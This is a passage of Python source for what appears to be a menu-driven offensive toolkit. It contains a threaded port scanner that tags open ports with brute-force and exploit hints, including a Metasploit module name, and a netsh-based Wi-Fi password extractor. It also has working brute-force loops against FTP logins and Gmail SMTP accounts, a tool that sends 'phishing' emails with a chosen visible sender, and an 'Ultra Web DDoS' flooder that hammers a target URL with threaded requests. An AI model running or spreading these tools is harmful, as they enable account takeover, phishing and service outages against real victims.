                                                file5.write("The target " + "has the open ports: " + "\n" + str(list_of_vuln) + "and the vulnerabilities may be: " + "\n" + "1. a ftp backdoor ( on port 21 if is open) or in can be bruteforce" + "\n" + "2. vulnerable on ssh ( on port 22 if is open) and it can be bruteforce")
                                                file5.close()


                                        if z == "2":
                                            try:
                                                print_lock = threading.Lock()
                                                def pscan(port):
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                        con = sock.connect((ip, port))
                                                        with print_lock:
                                                            print("Port", port, "is open")
                                                            if port == 21:
                                                                print(Fore.BLUE + "[!] The target has a ftp backdoor (port 21) or in can be bruteforce  ")
                                                            if port == 22:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                            if port == 25:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on smtp (port 25) and it can be exploit a stack buffer overflow ")
                                                            if port == 80:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on http (port 80) and can be dos/ddos on  http")
                                                            if port == 110:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on pop3 (port 110) and it can be bruteforce")    
                                                            if port == 143:
                                                                print(Fore.BLUE + "[!] The targes is vulnerable on imap (port 143) and it can be bruteforce")
                                                            if port == 443:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on https (port 443) and it can be dos/ddos on https")
                                                        con.close()
                                                    except:
                                                        pass
                                                    
                                                    
                                                def threader():
                                                    while True:
                                                        worker = q.get()
                                                        pscan(worker)
                                                        q.task_done()
                                                q = Queue()
                                                for x in range(int(number_of_threads)):
                                                    t = threading.Thread(target=threader)
                                                    t.daemon = True
                                                    t.start()
                                                for worker in range(1, 444):
                                                    q.put(worker)
                                                q.join()


                                            except KeyboardInterrupt:
                                                exit()
                                        if z == "3":
                                            try:
                                                print_lock = threading.Lock()
                                                def pscan(port):
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                        con = sock.connect((ip, port))
                                                        with print_lock:
                                                            print(Fore.BLUE + "Port", port, "is open")
                                                            if port == 21:
                                                                print(Fore.BLUE + "[!] The target has a ftp backdoor (port 21) or in can be bruteforce  ")
                                                            if port == 22:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                            if port == 25:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on smtp (port 25) and it can be exploit a stack buffer overflow ")
                                                            if port == 80:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on http (port 80) and can be dos/ddos on  http")
                                                            if port == 110:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on pop3 (port 110) and it can be bruteforce")    
                                                            if port == 143:
                                                                print(Fore.BLUE + "[!] The targes is vulnerable on imap (port 143) and it can be bruteforce")
                                                            if port == 443:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on https (port 443) and it can be dos/ddos on https")
                                                            if port == 445:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on microsft-ds (port 445) and it bruteforce or it can be exploited (on linux with metasploit framework) with the module exploit/windows/smb/ms08_netapi")
                                                            if port == 3306:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on MySql (port 3306) and it can be bruteforce")
                                                            if port == 3389:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on RDP (port 3389) and it can be bruteforce")
                                                        con.close()
                                                    except:
                                                        pass
                                                    
                                                    
                                                def threader():
                                                    while True:
                                                        worker = q.get()
                                                        pscan(worker)
                                                        q.task_done()
                                                q = Queue()
                                                for x in range(int(number_of_threads)):
                                                    t = threading.Thread(target=threader)
                                                    t.daemon = True
                                                    t.start()
                                                for worker in range(1, 16000):
                                                    q.put(worker)
                                                q.join()
                                            except KeyboardInterrupt:
                                                exit()

                                    except KeyboardInterrupt:
                                        exit()

                                if b == "2":
                                    try:
                                        z = input(Fore.GREEN + "[+] Enter the mode: ")
                                        print(Fore.BLUE + "-------Trying-------")
                                        if z == "1":
                                            try:
                                                print_lock = threading.Lock()
                                                def pscan(port):
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                        con = sock.connect((ip, port))
                                                        with print_lock:
                                                            print(Fore.BLUE + "Port", port, "is open")
                                                            if port == 21:
                                                                print(Fore.BLUE + "[!] The target has a ftp backdoor (port 21) or in can be bruteforce ")
                                                            if port == 22:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                        con.close()
                                                    except:
                                                        pass
                                                    
                                                    
                                                def threader():
                                                    while True:
                                                        worker = q.get()
                                                        pscan(worker)
                                                        q.task_done()
                                                q = Queue()
                                                for x in range(int(number_of_threads)):
                                                    t = threading.Thread(target=threader)
                                                    t.daemon = True
                                                    t.start()
                                                for worker in range(1, 23):
                                                    q.put(worker)
                                                q.join()
                                            except KeyboardInterrupt:
                                                exit()
                                        if z == "2":
                                            try:
                                                print_lock = threading.Lock()
                                                def pscan(port):
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                        con = sock.connect((ip, port))
                                                        with print_lock:
                                                            print("Port", port, "is open")
                                                            if port == 21:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on ftp (port 21) and it can be bruteforce")
                                                            if port == 22:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                            if port == 25:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on smtp (port 25) and it can be exploit a stack buffer overflow ")
                                                            if port == 80:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on http (port 80) and can be dos/ddos on  http")
                                                            if port == 110:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on pop3 (port 110) and it can be bruteforce")    
                                                            if port == 143:
                                                                print(Fore.BLUE + "[!] The targes is vulnerable on imap (port 143) and it can be bruteforce")
                                                            if port == 443:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on https (port 443) and it can be dos/ddos on https")
                                                        con.close()
                                                    except:
                                                        pass
                                                    
                                                    
                                                def threader():
                                                    while True:
                                                        worker = q.get()
                                                        pscan(worker)
                                                        q.task_done()
                                                q = Queue()
                                                for x in range(int(number_of_threads)):
                                                    t = threading.Thread(target=threader)
                                                    t.daemon = True
                                                    t.start()
                                                for worker in range(1, 444):
                                                    q.put(worker)
                                                q.join()
                                            except KeyboardInterrupt:
                                                exit()
                                        if z == "3":
                                            try:
                                                print_lock = threading.Lock()
                                                def pscan(port):
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                        con = sock.connect((ip, port))
                                                        with print_lock:
                                                            print("Port", port, "is open")
                                                            if port == 21:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on ftp (port 21) and it can be bruteforce")
                                                            if port == 22:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                            if port == 25:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on smtp (port 25) and it can be exploit a stack buffer overflow ")
                                                            if port == 80:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on http (port 80) and can be dos/ddos on  http")
                                                            if port == 110:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on pop3 (port 110) and it can be bruteforce")    
                                                            if port == 143:
                                                                print(Fore.BLUE + "[!] The targes is vulnerable on imap (port 143) and it can be bruteforce")
                                                            if port == 443:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on https (port 443) and it can be dos/ddos on https")
                                                            if port == 445:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on microsft-ds (port 445) and it bruteforce or it can be exploited (on linux with metasploit framework) with the module exploit/windows/smb/ms08_netapi")
                                                            if port == 3306:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on MySql (port 3306) and it can be bruteforce")
                                                            if port == 3389:
                                                                print(Fore.BLUE + "[!] The target is vulnerable on RDP (port 3389) and it can be bruteforce")
                                                        con.close()
                                                    except:
                                                        pass
                                                    
                                                    
                                                def threader():
                                                    while True:
                                                        worker = q.get()
                                                        pscan(worker)
                                                        q.task_done()
                                                q = Queue()
                                                for x in range(int(number_of_threads)):
                                                    t = threading.Thread(target=threader)
                                                    t.daemon = True
                                                    t.start()
                                                for worker in range(1, 16000):
                                                    q.put(worker)
                                                q.join()
                                            except KeyboardInterrupt:
                                                exit()
                                    except KeyboardInterrupt:
                                        exit()
                            except KeyboardInterrupt:
                                exit()

                        if comman == "search_info":
                            try:
                                print("\n" + Fore.BLUE +  "[!] If you want to scan a website enter only the domain not the whole name" + "\n" + Fore.BLUE +  "[!] The modes are: " + "\n" +  Fore.BLUE +  "   1 = It scans for vulnerablities on the port range 1-23" + "\n" +  Fore.BLUE +  "   2 = It scans for vulnerabilities on the port range 1-444" + "\n" + Fore.BLUE +  "   3 = It scans for vulnerablities on the port range 1-16000")
                            except KeyboardInterrupt:
                                exit()
                        if comman == "cls":
                            try:
                                os.system("cls")
                            except:
                                os.system("clear")    

                if tool1 == "07":
                    print(
                        """
                        __        ___  __ _                                             _ 
                        \ \      / (_)/ _(_)  _ __   __ _ ___ _____      _____  _ __ __| |
                         \ \ /\ / /| | |_| | | '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
                          \ V  V / | |  _| | | |_) | (_| \__ \__ \\ V  V / (_) | | | (_| |
                           \_/\_/  |_|_| |_| | .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_| ~>Wifi Password Extracter<~
                                             |_|                                          ~~>Made by tfwcodes(github)<~~  
                                   _                  _
                          _____  _| |_ _ __ __ _  ___| |_ ___ _ __  
                         / _ \ \/ / __| '__/ _` |/ __| __/ _ \ '__| 
                        |  __/>  <| |_| | | (_| | (__| ||  __/ |
                         \___/_/\_|__ |_|  \__,_|\___|\__\___|_|


                        """
                    )
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[!] Enter extract_wifi to extract a specific wifi password that you were connected at least 1 time on your pc" + "\n" + Fore.BLUE +  "[!] Enter cls to clear the screen" + "\n" + Fore.BLUE + "[!] Enter Ctrl+C to exit the programm" + "\n")
                            opd = input("[+] Enter a commmand to run: ")   
                            if opd == "extract_wifi":
                                try:
                                    fsde = input(Fore.GREEN + "[+] Enter the name of the wifi: ")
                                    try:
                                        os.system("netsh wlan show profile name='{fsde}' key=clear")
                                    except:
                                        print("[!!!] The Wireless AutoConfig Service (wlansvc) is not running. ")
                                except KeyboardInterrupt:
                                    exit()
                            if opd == "cls":
                                try:
                                    os.system("cls")
                                except:
                                    os.system("clear")            
                        except KeyboardInterrupt:
                            exit()

                if tool1 == "08":
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[!] Enter start_user to start scanning for vulnerabilities in a user's server " + "\n" + Fore.BLUE +  "[!] Enter scan_info to see info about the scan" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n")
                            hlp = input(Fore.GREEN + "[+] Enter a command: ")
                            if hlp == "start_user":
                                try:
                                    cf = input(Fore.GREEN + "[+] Enter the ip addres of the user: ")
                                    number_of_threads = input(Fore.GREEN + "[+] Enter the number of threads for the scan: ")
                                    z = input(Fore.GREEN + "[+] Enter the mode: ")
                                    print(Fore.GREEN + "-------Trying-------")
                                    if z == "1":
                                            print_lock = threading.Lock()
                                            def pscan(port):
                                                try:
                                                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                    con = sock.connect((ip, port))
                                                    with print_lock:
                                                        print(Fore.GREEN + "Port", port, "is open")
                                                        try:
                                                            if port == 21:
                                                                try:
                                                                    print(Fore.BLUE + "[!] The target has a ftp backdoor (port 21) or in can be bruteforce  ")
                                                                except KeyboardInterrupt:
                                                                    exit()
                                                            if port == 22:
                                                                try:
                                                                    print(Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                                except KeyboardInterrupt:
                                                                    exit()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                    con.close()
                                                except:
                                                    pass
                                                
                                                
                                            def threader():
                                                while True:
                                                    worker = q.get()
                                                    pscan(worker)
                                                    q.task_done()
                                            q = Queue()
                                            for x in range(int(number_of_threads)):
                                                t = threading.Thread(target=threader)
                                                t.daemon = True
                                                t.start()
                                            for worker in range(1, 23):
                                                q.put(worker)
                                            q.join()
                                    if z == "2":
                                        try:
                                            print_lock = threading.Lock()
                                            def pscan(port):
                                                try:
                                                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                    con = sock.connect((ip, port))
                                                    with print_lock:
                                                        print("Port", port, "is open")
                                                        if port == 21:
                                                            print(Fore.BLUE + "[!] The target has a ftp backdoor (port 21) or in can be bruteforce  ")
                                                        if port == 22:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                        if port == 25:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on smtp (port 25) and it can be exploit a stack buffer overflow ")
                                                        if port == 80:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on http (port 80) and can be dos/ddos on  http")
                                                        if port == 110:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on pop3 (port 110) and it can be bruteforce")    
                                                        if port == 143:
                                                            print(Fore.BLUE + "[!] The targes is vulnerable on imap (port 143) and it can be bruteforce")
                                                        if port == 443:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on https (port 443) and it can be dos/ddos on https")
                                                    con.close()
                                                except:
                                                    pass
                                                
                                                
                                            def threader():
                                                while True:
                                                    worker = q.get()
                                                    pscan(worker)
                                                    q.task_done()
                                            q = Queue()
                                            for x in range(int(number_of_threads)):
                                                t = threading.Thread(target=threader)
                                                t.daemon = True
                                                t.start()
                                            for worker in range(1, 444):
                                                q.put(worker)
                                            q.join()
                                        except KeyboardInterrupt:
                                            exit()
                                    if z == "3":
                                        try:
                                            print_lock = threading.Lock()
                                            def pscan(port):
                                                try:
                                                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                    con = sock.connect((ip, port))
                                                    with print_lock:
                                                        print(Fore.BLUE + "Port", port, "is open")
                                                        if port == 21:
                                                            print(Fore.BLUE + "[!] The target has a ftp backdoor (port 21) or in can be bruteforce  ")
                                                        if port == 22:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                        if port == 25:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on smtp (port 25) and it can be exploit a stack buffer overflow ")
                                                        if port == 80:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on http (port 80) and can be dos/ddos on  http")
                                                        if port == 110:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on pop3 (port 110) and it can be bruteforce")    
                                                        if port == 143:
                                                            print(Fore.BLUE + "[!] The targes is vulnerable on imap (port 143) and it can be bruteforce")
                                                        if port == 443:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on https (port 443) and it can be dos/ddos on https")
                                                        if port == 445:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on microsft-ds (port 445) and it bruteforce or it can be exploited (on linux with metasploit framework) with the module exploit/windows/smb/ms08_067_netapi")
                                                        if port == 3306:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on MySql (port 3306) and it can be bruteforce")
                                                        if port == 3389:
                                                            print(Fore.BLUE + "[!] The target is vulnerable on RDP (port 3389) and it can be bruteforce")
                                                    con.close()
                                                except:
                                                    pass
                                                
                                                
                                            def threader():
                                                while True:
                                                    worker = q.get()
                                                    pscan(worker)
                                                    q.task_done()
                                            q = Queue()
                                            for x in range(int(number_of_threads)):
                                                t = threading.Thread(target=threader)
                                                t.daemon = True
                                                t.start()
                                            for worker in range(1, 16000):
                                                q.put(worker)
                                            q.join()
                                        except KeyboardInterrupt:
                                            exit()
                                except KeyboardInterrupt:
                                    exit()
                            if hlp == "search_info":
                                try:
                                    print(Fore.BLUE + "[!] Vulnerability Searcher to scan a user's server. Hope you enjoy it:)")
                                except KeyboardInterrupt:
                                    exit()
                            
                            if hlp == "cls":
                                try:
                                    os.system("cls")
                                except:
                                    os.system("clear")

                        except KeyboardInterrupt:
                            exit()             

                if tool1 == "cls":
                    try:
                        os.system('cls')
                    except:
                        os.system('clear')



            except KeyboardInterrupt:
                exit()


        if menu_help == "2":
            try:
                # The tool menu attack
                print("\n" + Fore.BLUE +  "[09] Ftp BruteForce Attack" + "\n" + Fore.BLUE +  "[10] Gmail BruteForce Attack" + "\n")
                tool2 = input("[+] Enter what tool you want to use: ")
                if tool2 == "09":
                    try:
                        # The banner
                        print(
                            Fore.GREEN + 
                            """
                                       __ _                                                     _ 
                                      / _| |_ _ __    _ __   __ _ ___ _____      _____  _ __ __| |
                                     | |_| __| '_ \  | '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
                                     |  _| |_| |_) | | |_) | (_| \__ \__   V  V / (_) | | | (_|  | ~>Port 21(Ftp) bruteforce tool<~
                                     |_|  \__| .__/  | .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_| ~~>Created by tfwcodes(github)<~~
                                             |_|     |_|

                            """
                        )
                        while True:
                            try:
                                # Help menu
                                print("\n" + Fore.BLUE + "[!] Enter ftp_crack to start the ftp bruteforce" + "\n" + Fore.BLUE +  "[!] Enter ftp_info to see the requirements of the attack (You might wanna see this if you never tested the app)" + "\n"  + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n" + Fore.BLUE +  "[!] Enter Ctrl+C to start exit the program" + "\n")
                                menu = input("[+] Enter a command: ")
                                if menu == "ftp_crack":
                                    try:
                                        # Brute login
                                        def brtueLogin(hostname, passwdFile):
                                            # It will try to read the password file and if the password file path is incorrect/does not exits it will print file doesnt exist
                                            try:
                                                pF = open(passwdFile, "r")
                                            except:
                                                print(Fore.BLUE + "[!] File path does not exists")
                                                input()
                                                exit()
                                            # Split the usernames and passwords that are in the dictionary
                                            for line in pF.readlines():
                                                # Split the username
                                                userName = line.split(":")[0]
                                                # Split the password
                                                passWord = line.split(":")[1].strip("\n")
                                                print(Fore.BLUE + "[+] Trying : " + userName + "/" + passWord)
                                                try:
                                                    # Start the ftp server with ftplib
                                                    ftp = ftplib.FTP(hostname)
                                                    # Try to login with ftp
                                                    login = ftp.login(userName, passWord)
                                                    # If its succed then it will print the username + the password
                                                    print(Fore.BLUE + "[+] Login Suceeded With :" + userName + "/" + passWord)
                                                    input()
                                                    ftp.quit()
                                                # It will print password was not found if it didnt manage to find the password
                                                except:
                                                    pass
                                            print(Fore.BLUE + "[-] Password was not found")
                                            input()
                                            exit()

                                        def worker():
                                            # Enter the ip of the victim
                                            host = input(Fore.GREEN + "[+] Enter the ip of the target: ")

                                            print_lock = threading.Lock()
                                            def pscan(port):
                                                try:
                                                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                    con = sock.connect((host, port))
                                                    with print_lock:
                                                        if port == 21:
                                                            try:
                                                                print(Fore.BLUE + "[!] The target has port 21 open")
                                                            except:
                                                                print(Fore.BLUE + "[-] The target has the port 21 closed")
                                                    con.close()
                                                except:
                                                    pass
                                                
                                                
                                            def threader():
                                                while True:
                                                    worker = q.get()
                                                    pscan(worker)
                                                    q.task_done()
                                            q = Queue()
                                            for x in range(50):
                                                t = threading.Thread(target=threader)
                                                t.daemon = True
                                                t.start()
                                            for worker in range(1, 22):
                                                q.put(worker)
                                            q.join()
                                            try:
                                                # if the ip is valid it will print that the ip is valid
                                                print(ipaddress.ip_address(host))
                                                print(Fore.BLUE + "[!] The ip is valid")
                                                # Except if the ip is not valid
                                            except:
                                                # It will print the ip is not valid
                                                print(Fore.BLUE + "[-] The ip is not valid")
                                            print(Fore.BLUE + "[!!!] Enter the full path")
                                            # Asks for the full path of the dictionary
                                            passwdFile = input(Fore.GREEN + "[+] Enter the path file of the dictionary(usernames + passwords): ")
                                            # Brute force the ip with the dictionary that it was providided
                                            brtueLogin(host, passwdFile)


                                        worker()
                                        # The number of threads for the attack
                                        threads = []
                                        number_of_threads = input("[+] Enter the number of threads: ")

                                        # Start the multithreading
                                        # Int the variable number_of_threads because its an integer
                                        for i in range(int(number_of_threads)):
                                            t = threading.Thread(target=worker)
                                            # Start the threads
                                            t.start()
                                            # Append the thread t into the list named threads
                                            threads.append(t)

                                        for i in range(int(number_of_threads)):
                                            # Join the threads
                                            t.join()
                                    except KeyboardInterrupt:
                                        exit()
                                if menu == "ftp_info":
                                    try:
                                        # Info about the ftp attack
                                        print("\n" + Fore.BLUE +  "1. The target must have port 21(Ftp which means file transfer protocol) open" + "\n" +  Fore.BLUE + "2. You must have a dictionary with usernames + passwords")
                                    except KeyboardInterrupt:
                                        exit()
                                if menu == "cls":
                                    # If the user is running windows it will clear the screen with the command cls
                                    try:
                                        os.system('cls')
                                    # Except if the user is running another operating system like linux/mac it will write the command clear
                                    except:
                                        os.system("clear ")
                            # If the user presses Ctrl+C it will exit
                            except KeyboardInterrupt:
                                exit()

                    except KeyboardInterrupt:
                            exit()

                if tool2 == "10":
                    # The banner
                    print(
                        Fore.GREEN + 
                        """
                    ...
                                 ;::::;   ~>Bruteforce tool on gmail<~
                               ;::::; :;  ~~>Made by tfwcodes(github)<~~
                             ;:::::'   :;
                            ;:::::;     ;.
                           ,:::::'       ;           OOO
                           ::::::;       ;          OOOOO
                           ;:::::;       ;         OOOOOOOO
                          ,;::::::;     ;'         / OOOOOOO
                        ;:::::::::`. ,,,;.        /  / DOOOOOO
                      .';:::::::::::::::::;,     /  /     DOOOO
                     ,::::::;::::::;;;;::::;,   /  /        DOOO
                    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
                    :`:::::::`;::::::;;::: ;::#  /            DOOO
                    ::`:::::::`;:::::::: ;::::# /              DOO
                    `:`:::::::`;:::::: ;::::::#/               DOO
                     :::`:::::::`;; ;:::::::::##                OO
                     ::::`:::::::`;::::::::;:::#                OO
                     `:::::`::::::::::::;'`:;::#                O
                      `:::::`::::::::;' /  / `:#
                       ::::::`:::::;'  /  /   `#
                    """)
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[!] Enter gmail_start to start the bruteforce attack" + "\n" + Fore.BLUE +  "[!] Enter gmail_info to see the requirements for the attack (you might wanna enter this before starting the attack)" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen " + "\n" + Fore.BLUE + "[!] Enter Ctrl+C to exit the program" + "\n")
                            help_menu = input("[+] Enter a command: ")
                            if help_menu == "gmail_start":
                                try:
                                    # Start the smtp server with the port 587
                                    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
                                    smtpserver.ehlo()
                                    smtpserver.starttls()
                                    try:
                                        # Target email addres
                                        user = input(Fore.GREEN + "[+] Enter The Target Email Address: ")
                                        # Dictionary for the bruteforce
                                        print(Fore.BLUE + "[!!!] Enter the full path")
                                        passwfile = input(Fore.GREEN + "[+] Enter The Dictionary: ")
                                        passwfile = open(passwfile, "r")
                                    except:
                                        print(Fore.BLUE + "[-]The password path is incorrect")

                                    # list of threads
                                    threads = []

                                    for password in passwfile:
                                        # Try to login
                                        try:
                                            smtpserver.login(user, password)
                                            # Starting the threads for the attack
                                            t = threading.Thread()
                                            t.daemon = True
                                            t.start()
                                            threads.append(t)
                                            for i in range(50):
                                                t.join()
                                            # If it founds the passoword first it will input and whatever key the user is gonna press it will exit
                                            print(Fore.GREEN + "[+] Password Found: %s" % password)
                                            input()
                                            break
                                            input()
                                        # Except if it didn't manage to find the password
                                        except smtplib.SMTPAuthenticationError:
                                            print(Fore.GREEN + "[-] Incorrect Password: %s" % password)
                                # If the user is gonna press Ctrl+C it is gonna exit
                                except KeyboardInterrupt:
                                    exit()
                            # Print info about the attack 
                            if help_menu == "gmail_info":
                                try:
                                    print("\n" + Fore.BLUE + "[!]  To start the attack the target must have less secure apps on")
                                except KeyboardInterrupt:
                                    exit()
                            # it will try to run the command cls 
                            if help_menu == "cls":
                                try:
                                    os.system('cls')
                                # Except the user is not running Windows it will write the command clear
                                except:
                                    os.system("clear")
                        except KeyboardInterrupt:
                            exit()
                if tool2 == "cls":
                    try:
                        os.system('cls')
                    except:
                        os.system('clear')


            except KeyboardInterrupt:
                exit()


        if menu_help == "3":
            try:    
                print("\n" + Fore.BLUE + "[11] Phising Gmail Toolkit" + "\n")
                kf = input("[+] Enter what tool do you want to acces: ")
                if kf == "11":
                    # The banner
                    print(
                        Fore.GREEN + 
                        """

                         ____  _     _     _                ____                 _ _ 
                        |  _ \| |__ (_)___(_)_ __   __ _   / ___|_ __ ___   __ _(_) |
                        | |_) | '_ \| / __| | '_ \ / _` | | |  _| '_ ` _ \ / _` | | |
                        |  __/| | | | \__ \ | | | | (_| | | |_| | | | | | | (_| | | |  ~>Phishing gmail toolkit<~
                        |_|   |_| |_|_|___/_|_| |_|\__, |  \____|_| |_| |_|\__,_|_|_| ~~>Made by tfwcodes(github)<~~
                                                   |___/
                         _____           _ _      _ 
                        |_   _|__   ___ | | | _(_) |_
                          | |/ _ \ / _ \| | |/ / | __|
                          | | (_) | (_) | |   <| | |_
                          |_|\___/ \___/|_|_|\_\_|\__|
                        

                        """
                    )
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[!] Enter gmail_send to send a phising gmail" + "\n" + Fore.BLUE + "[!] Enter requirments_info to see the requirments (you might wanna enter this before starting the attack)" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n" + Fore.BLUE + "[!] Enter Ctrl+C to exit the programm" + "\n")
                            commd = input("[+] Enter a command: ")
                            # If the user is gonna use the command gmail_send it will start the phising gmail
                            if commd == "gmail_send":
                                while True:
                                    try:
                                        # The email that the target will see
                                        send_email = input(Fore.GREEN + "[+] Enter the email which the target will see: ")
                                        # The target
                                        recv = input(Fore.GREEN + "[+] Enter your target email: ")
                                        # email password
                                        email_password = input(Fore.GREEN + "[+] Enter the password of your email: ")
                                        # The text message that it is gonna be send
                                        mess = input(Fore.GREEN + "[+] Enter the text you want to send: ")

                                        # Smtp server on port 487
                                        server = smtplib.SMTP("smtp.gmail.com", 587)
                                        # Start the server
                                        server.starttls()

                                        try:
                                            # Login wiht the credentials 
                                            server.login(send_email, email_password)
                                            print(Fore.BLUE + "[!] The login was succes")
                                        except smtplib.SMTPAuthenticationError:
                                            print(Fore.BLUE + "[!] Your credentials are invalid ")
                                            input()
                                            exit()
                                        server.sendmail(send_email, recv, mess)
                                        print(Fore.BLUE + "[!] The phising message was sent succesfully")
                                    except KeyboardInterrupt:
                                        exit()
                            # If the user is gonna use the command requirments_info it will print the requirments for the attack
                            if commd == "requirments_info":
                                try:
                                    print("\n" + Fore.BLUE + "[!] The email that you use to send the message must have less secure apps on")
                                except KeyboardInterrupt:
                                    exit()
                            # If the user is running Windwos it will execute the command cls, else If the user uses Linux/Mac it will execute the command clear
                            if commd == "cls":
                                try:
                                    os.system('cls')
                                except:
                                    os.system("clear")
                        except KeyboardInterrupt:
                            exit()
                if kf == "cls":
                    try:
                        os.system('cls')
                    except:
                        os.system("clear")
            except KeyboardInterrupt:
                exit()





        if menu_help == "4":
            try:
                # The menu 
                print("\n" + Fore.BLUE +  "[12] DDoS Menu" + "\n" +  Fore.BLUE + "[13] Request Flood" + "\n" + Fore.BLUE + "[14] SYN Flood Attack" + "\n" + Fore.BLUE + "[15] Udp Flood" + "\n"  + Fore.BLUE + "[16] Tcp Flood" + "\n" + Fore.BLUE + "[17] Ultra Web DDoS" + "\n" + Fore.BLUE + "[18] HTTP Flood Attack" + "\n")
                tool3 = input("[+] Enter what tool do you want to use: ")

                if tool3 == "17":
                    print(
                        Fore.GREEN + 
                        """

                        _   _ _ _              __        __   _       ____  ____       ____  
                       | | | | | |_ _ __ __ _  \ \      / /__| |__   |  _ \|  _ \  ___/ ___| 
                       | | | | | __| '__/ _` |  \ \ /\ / / _ \ '_ \  | | | | | | |/ _ \___ \     ~> Ultra Web DDoS <~
                       | |_| | | |_| | | (_| |   \ V  V /  __/ |_) | | |_| | |_| | (_) |__) |   ~~> Made by tfwcodes(github)<~~ 
                        \___/|_|\__|_|  \__,_|    \_/\_/ \___|_.__/  |____/|____/ \___/____/ 


                        """
                    )
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[!] Enter start_ddos to start the attack" + "\n" + Fore.BLUE + "[!] Enter attack_info to see info about the attack (you might wanna see this if you never tested the app)" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen")
                            command1 = input(Fore.GREEN + "[+] Enter a command: ")
                            if command1 == "start_ddos":
                                try:
                                    urltarget = input(Fore.GREEN + "[+] Enter the url target: ")
                                    threads_number = input(Fore.GREEN + "[+] Enter the number of threads: ")

                                    data = {
                                       'rcr_authenticate': '1',
                                       'rcr_user': 'E-mail',
                                       'rcr_pass': 'Password',
                                       'rcr_submit': 'Conectare'
                                    }

                                    ses2 = requests.session()

                                    def do_req():
                                        while True:
                                            response1 = requests.post(urltarget, data=data)
                                            response2 = ses2.get(urltarget)
                                            response3 = urlopen(urltarget)
                                            print(response1)
                                            print(response2)
                                            print(response3.status)
                                    
                                    threads_list = []

                                    class HttpThread:
                                        for i in range(int(threads_number)):
                                            t = threading.Thread(target=do_req)
                                            t.daemon = True
                                            threads_list.append(t)

                                        for i in range(int(threads_number)):
                                            threads_list[i].start()

                                        for i in range(int(threads_number)):
                                            threads_list[i].join()

                                except KeyboardInterrupt:
                                    exit()

                            if command1 == "attack_info":
